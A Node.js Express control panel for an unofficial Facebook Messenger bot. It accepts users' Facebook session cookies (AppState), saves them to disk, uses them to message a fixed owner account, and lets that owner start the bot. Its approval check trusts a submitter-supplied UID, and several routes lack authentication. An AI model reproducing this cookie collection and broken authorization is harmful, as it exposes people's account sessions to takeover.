const express = require("express");
const { fork } = require("child_process");
const fs = require("fs");
const ws3 = require("ws3-fca");

const OWNER_UID = "61578840237242";
const app = express();
const PORT = process.env.PORT || 3000;

let botProcess = null;
let logs = "";
let pendingApproval = false;

app.use(express.json());
app.use(express.static("public"));

app.post("/submit", (req, res) => {
  const { data, uid } = req.body;
  try {
    JSON.parse(data);
    fs.writeFileSync("appstate.json", data);
    fs.writeFileSync("admin.txt", uid);
    pendingApproval = true;
    logs += `📥 Approval request received from UID: ${uid}\n`;

    // 📬 Try sending FB message to owner
    const login = typeof ws3 === "function" ? ws3 : (ws3.default || ws3.login || ws3);
    const appState = JSON.parse(data);
    login({ appState }, (err, api) => {
      if (err) return logs += `❌ Could not notify owner: ${err.message}\n`;
      api.sendMessage(
        `📥 Approval request received.\n👤 From UID: ${uid}\n🔗 Visit panel to approve.`,
        OWNER_UID
      );
    });

    res.send("✅ Submitted! Waiting for approval.");
  } catch {
    res.send("❌ Invalid AppState JSON!");
  }
});

app.get("/approve-bot", (req, res) => {
  try {
    const currentUID = fs.readFileSync("admin.txt", "utf-8").trim();
    if (currentUID !== OWNER_UID)
      return res.send("⛔ Only owner can approve bot start.");

    if (botProcess) return res.send("⚠️ Bot already running.");
    if (!pendingApproval) return res.send("⚠️ No pending request to approve.");

    fs.writeFileSync("approvedBy.txt", currentUID);
    botProcess = fork("bot.js");
    pendingApproval = false;

    logs += `✅ BOT STARTED by OWNER at ${new Date().toLocaleString()}\n`;

    botProcess.stdout.on("data", (d) => {
      logs += d.toString();
      if (logs.length > 5000) logs = logs.slice(-5000);
    });

    botProcess.stderr.on("data", (d) => {
      logs += "[ERR] " + d.toString();
      if (logs.length > 5000) logs = logs.slice(-5000);
    });

    botProcess.on("exit", () => {
      logs += "\n🔴 Bot exited\n";
      botProcess = null;
    });

    res.send("✅ Approved & Bot started.");
  } catch (err) {
    res.send("❌ Approval failed.");
  }
});

app.get("/stop-bot", (_, res) => {
  if (!botProcess) return res.send("⚠️ Bot is not running.");
  botProcess.kill();
  botProcess = null;
  logs += "🔴 Bot manually stopped.\n";
  res.send("🔴 Bot stopped.");
});

app.get("/status", (_, res) => {
  res.send(botProcess ? "🟢 Bot is running" : pendingApproval ? "⏳ Awaiting approval..." : "🔴 Bot is stopped");
});

app.get("/logs", (_, res) => {
  res.send(logs || "📭 No logs yet...");
});

app.listen(PORT, () => {
  console.log(`🌐 PANEL running on http://localhost:${PORT}`);
});
